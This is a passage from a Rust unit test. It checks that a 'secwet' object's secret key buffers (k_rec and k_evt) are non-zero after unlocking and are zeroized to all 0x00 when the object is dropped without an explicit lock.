    let k_rec_drop_witness = unlocked_secwet.test_k_rec_witness();
    let k_evt_drop_witness = unlocked_secwet.test_k_evt_witness();

    {
        let rec = k_rec_drop_witness.lock().unwrap();
        let evt = k_evt_drop_witness.lock().unwrap();
        assert_ne!(*rec, [0u8; 32], "k_rec must be non-zero after unlocking");
        assert_ne!(*evt, [0u8; 32], "k_evt must be non-zero after unlocking");
    }

    // Drop the secwet instance without explicitly calling lock()
    drop(unlocked_secwet);

    // Witness buffers must be zeroized via Drop implementation
    {
        let rec = k_rec_drop_witness.lock().unwrap();
        let evt = k_evt_drop_witness.lock().unwrap();
        assert_eq!(
            *rec, [0u8; 32],
            "k_rec witness buffer must be zeroized to all 0x00 upon Drop"
        );
        assert_eq!(
            *evt, [0u8; 32],
            "k_evt witness buffer must be zeroized to all 0x00 upon Drop"
        );
    }
}
